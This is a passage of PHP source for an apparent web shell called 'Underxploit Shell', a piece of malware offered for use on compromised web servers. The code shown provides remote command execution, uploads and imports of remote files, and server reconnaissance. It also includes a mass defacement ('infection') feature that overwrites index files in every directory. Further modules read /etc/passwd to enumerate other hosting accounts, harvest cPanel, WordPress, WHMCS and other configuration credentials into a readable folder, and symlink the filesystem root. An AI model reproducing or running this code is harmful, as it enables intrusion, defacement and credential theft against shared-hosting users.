case 'about': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">ABOUT ME</td></table></div>';
		print '<div class="coL-option" style="padding:7px"><br /><br />
    <center><i class="zmdi zmdi-shield-check zmdi-hc-4x animated infinite rubberBand"></i></center><br />
    <center>
        <font size="4px" style="shadow:2px 2px 0px #fff">UNDERXPLOIT SHELL</font>
  			<br /><i class="zmdi zmdi-globe-lock zmdi-hc-fw"></i><span class="label-success"> http://' . $_SERVER['HTTP_HOST'] . '</span></center><br /><br />
	</div>

<div class="coL-panel top">
    <table>
        <td class="td-panel">
            <center>
                	<div class="loader"></div>
            	</center>
        	</td>
        <td class="td-panel-right">CREDITS</td>
    </table>
</div>
<div id="paksa"><table class="table-info">
    <tr class="ex-hov">
        <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Name</td>
        <td class="td-info">: Underxploit Shell</td>
    <tr class="ex-hov">
        <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Version</td>
        <td class="td-info">: 0.1.4 [ Dark ]</td>
    <tr class="ex-hov">
         <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Author</td>
         <td class="td-info">: Wildan Izzudin</td>
    <tr class="ex-hov">
          <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Email</td>
          <td class="td-info break">: <a class="a" href="mailto:underxploit@gmail.com">underxploit@gmail.com</a></td>
    <tr class="ex-hov">
           <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Facebook</td>
           <td class="td-info break">: <a class="a" href="http://www.facebook.com/WILDAN.OFFICIAL">@WILDAN.OFFICIAL</a></td>
    <tr class="ex-hov">
            <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Blog</td>
            <td class="td-info">: <a class="a" href="http://underxploit.blogspot.co.id">Underxploit Reborn</a></td>
	</table>
</div>
<div class="coL-option">
    <center><br />If there is any suggestion or feedback please contact me through the contact above.<br /><br />
        <center><br />&mdash; Thank You &mdash;</center>
	</div>
</div>';
break;

	case 'upload': print '<div class="coL-panel"><table>
		<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">MULTIPLE UPLOAD</td></table></div>';

switch (true) {
	case ($_REQUEST['upload']): switch (true) {
	case ($_UNDERXPLOIT['upload']): $ff = count($_FILES['file']['name']);
		for($i = 0; $i<$ff; $i++) {
			$drp = $_FILES['file']['name'][$i];
switch (true) {
	case (empty($drp)): continue 2;
break;
}

if (isset($_REQUEST['ufile'][$i])) {
	$ufile = $_REQUEST['ufile'][$i];
switch (true) {
	case (empty($ufile)): $cx = $_FILES['file']['name'][$i];
break;
	default: $cx = $ufile;
}

switch (true) {
	case (@copy($_FILES['file']['tmp_name'][$i], $dir . '/' . $cx)): bacot('File uploaded succesfully');
break;
	default: bacot('Failed to upload file');
			   }
			}
		} break;
	} break;
} 

	print '<script type="text/javascript">
$(document).ready(function() {
	var wr1 = $(".input_1");
	var add1 = $(".add_1"); 
	var x1 = 1; 

$(add1).click(function(e) { 
		e.preventDefault();
			if(x1 < 5) { 
				x1++; 
			$(wr1).append(\'<table><td class="tup" style="width:20%">File :</td><td style="width:80%"><input type="file" name="file[]"></td><tr><td class="tup" style="width:20%">Name :</td><td style="width:80%"><input name="ufile[]" type="text" placeholder="( Optional )" value="" /></td></table>\');
		} else {
			$(".add_1").hide();
		}
	});
$(wr1).on("click",".remove_field", function(e) { 
		e.preventDefault(); $(this).parent(\'div\').remove(); x1--;
	})
});</script>
		<div class="coL-option"><div class="wr"><span class="label-success"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></span> From Device : <button class="lawb add_1" style="width:50px;float:right">Add </button></div><hr>
    <form enctype="multipart/form-data" action="?' . x7 . 'upload&' . x5 . $dir . '" method="POST" style="margin:0px">
  <div class="input_1">      
<table>
            <td class="tup" style="width:20%">File :</td>
            <td style="width:80%">
                <input type="file" name="file[]"></td>
        <tr>
            <td class="tup" style="width:20%">Name :</td>
            <td style="width:80%"><input name="ufile[]" type="text" placeholder="( Optional )" value="" /></td>
 </table>
    	</div>                
<table><td style="width:20%"></td>
                <td style="width:80%"><input type="submit" name="upload" style="width:100px" value="Upload" class="btn-exe" />
            </td>
        </table>
    </form>
</div>';

if (isset($_UNDERXPLOIT['submit'])) {
	$url = count($_UNDERXPLOIT['url']);
		for($i = 0; $i < $url; $i++){
	$drq = $_UNDERXPLOIT['url'][$i];

switch (true) {
	case (empty($drq)): continue 2;
}

switch (true) {
	case(empty($_UNDERXPLOIT['uname'][$i])): $ufc = basename($drq);
break;
	default: $ufc = $_UNDERXPLOIT['uname'][$i];
}
switch (true) {
	case (op($ufc, $drq)): bacot('File imported');
break;
	default: bacot('Failed to import file');
		}
	}
}
print '<script type="text/javascript">
$(document).ready(function() {
	var wr2 = $(".input_2");
	var add2 = $(".add_2"); 
	var x2 = 1; 

$(add2).click(function(e) { 
		e.preventDefault();
			if(x2 < 5) { 
				x2++; 
			$(wr2).append(\'<table style="width:100%"><td class="tup" style="width:20%">Link :</td><td style="width:80%"><input type="text" name="url[]" placeholder="https://pastebin.com/raw/M4bJJtBD" style="width:100%"></td><tr><td class="tup" style="width:20%">Name :</td><td style="width:80%"><input type="text" name="uname[]" style="width:100%" placeholder="( Optional )"></td></table>\');
		} else {
			$(".add_2").hide();
		}
});
	$(wr2).on("click",".remove_field", function(e) { 
		e.preventDefault(); $(this).parent(\'div\').remove(); x2--;
	})
});</script>
<div class="coL-option top"><div class="wr"><span class="label-success"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></span> From Internet (Import) :  <button class="lawb add_2" style="width:50px;float:right">Add </button></div>
    <hr>
<form action="?' . x7 . 'upload&' . x5 . $dir . '" method="POST">
	<div class="input_2">
        <table style="width:100%">
            <td class="tup" style="width:20%">Link :</td>
            <td style="width:80%"><input type="text" name="url[]" placeholder="https://pastebin.com/raw/M4bJJtBD" style="width:100%"></td>
        <tr>
            <td class="tup" style="width:20%">Name :</td>
            <td style="width:80%"><input type="text" name="uname[]" style="width:100%" placeholder="( Optional )"></td>
     </table>
</div>
     <table>
            <td style="width:20%"></td>
            <td style="width:80%"><input type="submit" name="submit" style="width:100px" value="Upload" class="btn-exe"></td>
     </table>
    	</form>
	</div>
</div>';
break;

case 'system': 
	function exe($corey) {
switch (true) {
	case (function_exists('system')): 
		@ob_start();
		@system($corey);
			$corex = @ob_get_contents();
		@ob_end_clean();
			return $corex;
break;
	case (function_exists('exec')):
		@exec($corey, $values);
			$corex = "";
	foreach($values as $value) {
			$corex.= $result;
		} return $corex;
break;
	case (function_exists('passthru')):
		@ob_start();
		@passthru($corey);
			$corex = @ob_get_contents();
		@ob_end_clean();
			return $corex;
break;
	case (function_exists('shell_exec')):
			$corex = @shell_exec($corey);
			return $corex;
	}
}

	function disk($dz) {
switch (true) {
	case ($dz >= 1073741824): return sprintf('%1.2f', $dz / 1073741824) . ' GB';
break;
	case ($dz >= 1048576): return sprintf('%1.2f', $dz / 1048576) . ' MB';
break;
	case ($dz >= 1024): return sprintf('%1.2f', $dz / 1024) . ' KB';
break;
	default: return $dz . ' B';
	}
}

	function fuck($b_ms, $c_ms, $d_ms) {
		if (strpos($b_ms, $c_ms) === FALSE) return FALSE;
		if (strpos($b_ms, $d_ms) === FALSE) return FALSE;
		$a_ms = strpos($b_ms, $c_ms) + strlen($c_ms);
		$e_ms = strpos($b_ms, $d_ms, $a_ms);
		$f_ms = substr($b_ms, $a_ms, $e_ms - $a_ms);
		return $f_ms;
	}

switch (true) {
	case (get_magic_quotes_gpc()): function nom($pom) {
		return is_array($pom) ? array_map('nom', $pom) : stripslashes($pom);
	}
		$_UNDERXPLOIT = nom($_UNDERXPLOIT);
}

		$safemode = (@ini_get(strtolower("safe_mode")) == 'on') ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
		$disablefunc = @ini_get("disable_functions");
		$mysql = (function_exists('mysql_connect')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
		$curl = (function_exists('curl_version')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</font>";
		$wget = (exe('wget --help')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
		$perl = (exe('perl --help')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</font>";
		$python = (exe('python --help')) ? "<span class='label label-success'>ON</span>" : "<span class='label label-danger'>OFF</span>";
		$disfunc = (!empty($disablefunc)) ? "<span class='label-danger'>" . $disablefunc . "</span>" : "<span class='label-success'>NONE</span>";
	
switch (true) { 
	case (!function_exists('posix_getegid')):
		$_cox = @get_current_user();
		$_cid = @getmyuid();
		$_ccr = @getmygid();
		$_cum = "?";
break;
	default:
		$_cid = @posix_getpwuid(posix_geteuid());
		$_ccr = @posix_getgrgid(posix_getegid());
		$_cox = $_cid['name'];
		$_cid = $_cid['uid'];
		$_cum = $_ccr['name'];
		$_ccr = $_ccr['gid'];
}

print '<div class="coL-panel">
   <table>
        <td class="td-panel">
            <center>
                <div class="loader"></div>
            </center>
        </td>
        <td class="td-panel-right">SYSTEM INFORMATION</td>
    </table>
</div>';

print "<div id='paksa'><table width=100% class='table-info' cellspacing=0>
    <th class=th-info style=width:120px>
        <center>Component</center>
    </th>
    <th class=th-info>
        <center>Arrow</center>
    </th>
    <th class=th-info break>
        <center>Result</center>
    </th>
</tr>
	
<tr class='ex-hov'>
    <td class='td-info' style='width:130px'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Server </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'> " . $_SERVER['SERVER_SOFTWARE'] . "</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Username
    </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'> " . $_cox . " [" . $_cid . "]</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Group
    </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'>" . $_cum . " [" . $_ccr . "]</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Server IP </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'>" . gethostbyname($_SERVER['HTTP_HOST']) . "</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Your IP </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'> " . $_SERVER['REMOTE_ADDR'] . "</td>
</tr> 

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  PHP Version</td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'> " . @phpversion() . "</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Disk Space</td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'>[" . disk(disk_free_space(getcwd())) . "] / [" . disk(disk_total_space(getcwd())) . "]</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Safe Mode</td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'> $safemode</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  MySQL</td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'>$mysql</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Perl
    </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'> $perl </td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Python</td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'>$python</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  WGET</td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'>$wget</td>
</tr>

<tr class='ex-hov'>
    <td class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  CURL</td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'>$curl</td>
</tr>";
	
switch (true) {
	case (get_magic_quotes_gpc() == "1" or get_magic_quotes_gpc() == "on"):
		print "<tr class='ex-hov'>
    <td align='left' class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Magic Quotes </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td><span class='label label-success'>ON</span></tr>";
break;
	default:
		print "<tr class='ex-hov'>
    <td align='left' class='td-info'><span class='label label-success'><i class='zmdi zmdi-plus zmdi-hc-fw'></i></span>  Magic Quotes </td>
    <td class='td-info' align='center'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></td>
    <td class='td-info'><span class='label label-danger'>OFF</span></td>
</tr>";
}

print '</table></div>
<div class="coL-panel top">
    <table>
        <td class="td-panel">
            <center>
                <div class="loader"></div>
            </center>
        </td>
        <td class="td-panel-right">KERNEL</td>
    </table>
</div>';

print "<div class='coL-option' style='margin-bottom:3px;padding:7px'>" . php_uname() . "</div>";
print '<div class="coL-panel top">
    <table>
        <td class="td-panel">
            <center>
                <div class="loader"></div>
            </center>
        </td>
        <td class="td-panel-right">DISABLE FUNCTION</td>
    </table>
</div>';

print "<div class='coL-option wrap break' style='padding:7px'>" . $disfunc . "</div>
</div>";
break;

	case 'infection':
		print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">DIRECTORY INFECTION</td></table></div>';
		print "<form action='?" . x7 . "infection&". x5.$dir. "' method='post' style='padding:0;margin:0'>";
		print '<div class="coL-option">';
		print "<table cellspacing='0' cellpadding='3'><td align='left' style='padding:7px;width:60px'>
Root :</td><td><input type='text' name='base_dir' value='".getcwd()."'></td></tr>";
		print "<tr><td align='left' style='padding:7px;width:60px'>File :</td><td> <input type='text' name='file_name' value='index.php' style='width:100%' placeholder=''></td></tr></table>";
		print "</div>";

if (isset ($_UNDERXPLOIT['base_dir'])) {        
switch (true) {
	case (!file_exists ($_UNDERXPLOIT['base_dir'])) : bacot('Destination not found'); 
}
        @chdir ($_UNDERXPLOIT['base_dir']) or die ('jembut');
 
        $files = @scandir ($_UNDERXPLOIT['base_dir']) or die ("Oh Shit !!<br>");
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_UNDERXPLOIT['file_name'];
                        if (file_put_contents ($index, $_UNDERXPLOIT['index']))
                                print "
                <div class='coL-option break wrap' style='margin-top:2px;margin-bottom:2px;font-size:14px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span>  $index </span></div>"; }
        endforeach; 
	} else {
		print "<div id='paksa'><textarea name='index' class='lined'># Hacked By Wildan Izzudin !!</textarea>";
print '<script type="text/javascript">
$(function() {
	$(".lined").linedtextarea({selectedLine: 1});
}); </script>';
	print "<input type='submit' value='INFECT' class='btn-exe' style='width:100%;margin-top:3px'></div>";
}
print "</form></div>";
break;

	case 'multihash':
echo('<div class="coL-panel"><table>
<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">MULTIPLE HASH</td></table></div>');
if($_UNDERXPLOIT['encrypt']) {
	switch($_UNDERXPLOIT['id']) {
		case '1':
if(md5($_UNDERXPLOIT['text'])) {
echo("<div class='coL-option top'><table style='margin-bottom:3px'>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Text </td><td class='break'> : ".$_UNDERXPLOIT['text']."</td><tr><td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Md5 </td><td class='break'> : ".md5($_UNDERXPLOIT['text'])."</td></table></div>"); } else {
	error('Permission Denied !!');
	}
break;
case '2':
if(crc32($_UNDERXPLOIT['text'])) {
echo("<div class='coL-option top'><table style='margin-bottom:3px'>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Text </td><td class='break'> : ".$_UNDERXPLOIT['text']."</td><tr><td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Crc32 </td><td class='break'> : ".crc32($_UNDERXPLOIT['text'])."</td></table></div>"); } else {
	error('Permission Denied !!');
	}
break;
case '3':
if(sha1($_UNDERXPLOIT['text'])) {
echo("<div class='coL-option top'><table style='margin-bottom:3px'>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Text </td><td class='break'> : ".$_UNDERXPLOIT['text']."</td><tr><td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Sha1 </td><td class='break'> : ".sha1($_UNDERXPLOIT['text'])."</td></table></div>"); } else {
	error('Permission Denied !!');
	}
break;
case '4':
echo("<div class='coL-option top'><table style='margin-bottom:3px'>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> String </td><td class='break'> : ".$_UNDERXPLOIT['text']."</td><tr>
<td class='td-md5'
style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Md5 </td><td class='break'> : ".md5($_UNDERXPLOIT['text'])."</td><tr>
<td class='td-md5'
style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Crc32 </td><td class='break'> : ".crc32($_UNDERXPLOIT['text'])."</td><tr>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Sha1 </td><td class='break'> : ".sha1($_UNDERXPLOIT['text'])."</td></table></div>"); 
break;
	}
}
echo("<div class='coL-option top'>
	<form action='?".x7."multihash&".x5.$dir."' method='post'>
<table style='width:100%'>
	<td style='width:20%'>Text :</td><td style='width:80%'>
	<input type='text' name='text' style='width:100%'>
</td><tr>
<td style='width:20%'>Hash :</td><td style='width:80%'><select name='id' style='width:100%'>
<option value='1'>Md5</option>
<option value='2'>Crc32</option>
<option value='3'>Sha1</option>
<option value='4'>All</option>
</select></td><tr><td style='width:20%'></td><td style='width:80%'>
	<input type='submit' value='Create' name='encrypt' class='btn-exe' style='width:100px'></td></table></form></div></div>");
break;

	case 'jumping':
echo '<div class="coL-panel"><table>
<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">JUMPING SERVER</td></table></div>';
$i = 0;
$s_a = fopen("/etc/passwd", "r");
while($s_b = fgets($s_a)) {
	if($s_b == '' || !$s_a) {
		 bacot("Can't Read [ /etc/passwd ]");
                 mtr("?".x5.$dir);
                 echo x9;
	} else {
		preg_match_all('/(.*?):x:/', $s_b, $s_c);
		foreach($s_c[1] as $s_d) {
			$s_e = "/home/$s_d/public_html";
			if(is_readable($s_e)) {
				$i++;
				$s_o = "<div class='coL-option'><table class='table-file' cellspacing='0'><td style='width:120px' class='td-file' style='padding:7px'>  <a href='?dir=$s_e'><span class='label-success'> <i class='zmdi zmdi-folder-outline zmdi-hc-fw'></i> </span> [ $s_d ]</a></td>";
				
switch (true) {
	case (is_writable($s_e)):
		$s_o = "<div class='coL-option'><table class='table-file' cellspacing='0'><td style='width:120px' class='td-file' style='padding:7px'> <span class='label-success'> <i class='zmdi zmdi-folder-outline zmdi-hc-fw'></i> </span> <a href='?dir=$s_e'><font color='red'>[ $s_d ]</font></a></td>";
}
				echo $s_o;
				$s_k = file_get_contents("/etc/named.conf");	
				if($s_k == '') {
					 bacot('Server Not Found !!');
                     mtr("?".x5.$dir);
                      echo x9;
				} else {
					preg_match_all("#/var/named/(.*?).db#", $s_k, $s_v);
					foreach($s_v[1] as $s_x) {
						$s_g = posix_getpwuid(@fileowner("/etc/valiases/$s_x"));
						$s_g = $s_g['name'];
			
if($s_g == $s_d) {
							echo "<td class='td-file elip' style='padding:7px'><a href='http://$s_x'>http://$s_x</a> </td></table></div>"; break;}}}}}}}
			
switch ($i) {
	case 0;  mtr("? " .x5.$dir);
         bacot('Server not found'); print x9;
break;
	default:
		print "<div class='coL-option' style='padding:7px;margin-top:3px'>Total : <button class='lawb' style='width:60px;position:relative;top:0px'>".$i."</button></div></div>";

}
break;

	case 'config':
    	$s_t = fopen("/etc/passwd", "r");
    	$s_z = mkdir("_config", 0777);
    	$s_s = "Options all\
Require None\
Satisfy Any";
    $s_d = fopen("_config/.htaccess","w");
    fwrite($s_d, $s_s);
    while($s_q = fgets($s_t)) {
        if($s_q == "" || !$s_t) {
    bacot ('Can\'t Read etc/passwd !!');
        } else {
            preg_match_all('/(.*?):x:/', $s_q, $s_y);
            foreach($s_y[1] as $s_p) {
                $s_k = "/home/$s_p/public_html/";
                if(is_readable($s_k)) {
                    $s_g = array(
                        "/home/$s_p/.my.cnf" => "cpanel",
                        "/home/$s_p/.accesshash" => "WHM-accesshash",
                        "/home/$s_p/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$s_p/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$s_p/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$s_p/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$s_p/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$s_p/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$s_p/public_html/forum/config.php" => "phpBB",
                        "/home/$s_p/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$s_p/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$s_p/public_html/app/etc/local.xml" => "Magento",
                        "/home/$s_p/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$s_p/public_html/configuration.php" => "Joomla",
                        "/home/$s_p/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$s_p/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$s_p/public_html/wp-config.php" => "WordPress",
                        "/home/$s_p/public_html/admin/config.php" => "OpenCart",
                        "/home/$s_p/public_html/slconfig.php" => "Sitelok",
                        "/home/$s_p/public_html/application/config/database.php" => "Ellislab");
                    foreach($s_g as $s_h => $s_l) {
                        $s_r = file_get_contents($s_h);
                        if($s_r == '') {
                        	print x9;
                        } else {
                            $fcS = fopen("_config/$s_p-$s_l.txt","w");
                            fputs($fcS,$s_r);
                        }}}}}} 
bacot('Done');
print "<script>c('?".x5.$dir."/_config');</script>";
break;

case 'cpanel':
print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">CPANEL FINDER</td></table></div>';
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1) {
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
$d0mains = @file('/etc/named.conf');
switch (true) {
	case ($domains or $d0mains): switch (true) {
    case (scandir("/var/named")):
		print "<table><th class='th-file'> <center>Domain</center> </th><th class='th-file'> <center>Result</center></th></tr>";
$count=1; $dc = 0;
$list = scandir("/var/named");
	foreach($list as $domain) {
switch(true) {
	case (strpos($domain,".db")):
		$domain = str_replace('.db','',$domain);
		$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
		$dirz = '/home/'.$owner['name'].'/.my.cnf';
		$path = getcwd();

switch (true) {
	case (is_readable($dirz)): copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
		$p = file_get_contents(''.$path.'/'.$owner['name'].'.txt');
		$password = entre2v2($p,'password="','"');
print "<tr>
<td class='td-file' style='width:150px'><a href='http://".$domain.":2082' target='_blank'>".$domain."</a></td>
<td class='td-file'><a class='a' href='".$owner['name'].".txt' target='_blank'>OPEN</a></td></tr>";
$dc++; 
		}
	}
}

print '</table>';
$total = $dc;
print "<div class='coL-option' style='padding:7px;margin-top:3px'>Total Cpanel : <button class='lawb' style='width:60px;position:relative;top:0px'>".$total."</button></div></div>";

break;
	default: $d0mains = @file('/etc/named.conf');
    if($d0mains) {
print "<table><tr><th class='th-file'> <center>Domain</center> </th><th class='th-file'> <center>Result</center> </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
switch (true) {
    case (@eregi('zone',$d0main)): preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
switch (true) {
    case (strlen(trim($domain[1][0])) >2):
            $mck[] = $domain[1][0];
        } 
	} 
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $files = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $files['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d); 
switch (true) {
    case (strpos($r[5],'home')): $passwd[$r[0]] = $r[5];
    }
}
$l=0; $j=1;
	foreach($usr as $r) {
		$dirz = '/home/'.$r.'/.my.cnf';
		$path = getcwd();
switch (true) {
	case (is_readable($dirz)): copy($dirz, $path.'/'.$r.'.txt');
		$p = file_get_contents($path.'/'.$r.'.txt');
		$password = entre2v2($p,'password="','"');
print "<tr>
	<td class='td-file'><a target='_blank' href=http://".$dmn[$j-1]."/>".$dmn[$j-1]." </a></td>
	<td class='td-file'><a href='".$r.".txt'>OPEN</a> </center></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
		}
	}
} print '</table>';
$total = $dc;
	print "<div class='coL-option' style='padding:7px;margin-top:3px'>Total Cpanel : <button class='lawb' style='width:60px;position:relative;top:0px'>".$total."</button></div></div>";
} 
break;
	default: mtr('?'.x5.$dir);
	bacot('Permission denied'); print x9; 
} 
break;

	case 'symlink':
print '<div class="coL-panel"><table>
<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">MULTIPLE SYMLINK</td></table></div>';

switch (true) {
	case (is_readable("/etc/named.conf")): $named = '<a href="?' . x7 . 'named.conf&dir='.$dir.'">OPEN</a>';
break;
	default: $named = '<font color="red">DISABLED</font>';
}

switch (true) {
	case (is_readable("/etc/valiases")): $valiases = '<a href="?' . x7 . 'valiases&dir='.$dir.'">OPEN</a>';
break;
	default: $valiases = '<font color="red">DISABLED</font>';
}

switch (true) {
	case (is_readable("/etc/passwd")): $passwd = '<a href="?' . x7 . 'passwd&dir='.$dir.'">OPEN</a>';
break;
	default : $passwd = '<font color="red">DISABLED</font>';
}

switch (true) {
	case (is_readable("/var/named")): $var = '<a href="?' . x7 . 'var&dir='.$dir.'">OPEN</a>';
break;
	default: $var = '<font color="red">DISABLED</font>';
}  

	print '<table class="table-file" cellspacing="0">';
	print '<th class="th-file">From</th><th class="th-file">Arrow</th><th class="th-file">Action</th>';
	print '<tr><td class="td-file" style="padding:7px"><span class="label-success"><i class="zmdi zmdi-folder-outline zmdi-hc-fw"></i></span> [ /etc/named.conf ]</td><td class="td-file"><center><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></center></td><td class="td-file"><center>'.$named.'</a></center></td>';
	print '<tr><td class="td-file" style="padding:7px"><span class="label-success"><i class="zmdi zmdi-folder-outline zmdi-hc-fw"></i></span> [ /etc/valiases ]</td><td class="td-file""><center><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></center></td><td class="td-file"><center>'.$valiases.'</a></center></td>';
	print '<tr><td class="td-file" style="padding:7px"><span class="label-success"><i class="zmdi zmdi-folder-outline zmdi-hc-fw"></i></span> [ /etc/passwd ]</td><td class="td-file"><center><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></center></td><td class="td-file"><center>'.$passwd.'</a></center></td>';
	print '<tr><td class="td-file" style="padding:7px"><span class="label-success"><i class="zmdi zmdi-folder-outline zmdi-hc-fw"></i></span> [ /var/named/ ]</td><td class="td-file"><center><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></center></td><td class="td-file"><center>'.$var.'</a></center></td>';
	print '</table></div>';

@mkdir('pee', 0777); @symlink("/", "pee/root");
$htaccss = "Options all 
DirectoryIndex Sux.html 
AddType text/plain .php 
AddHandler server-parsed .php 
AddType text/plain .html 
AddHandler txt .html 
Require None 
Satisfy Any";
file_put_contents("pee/.htaccess",$htaccss);
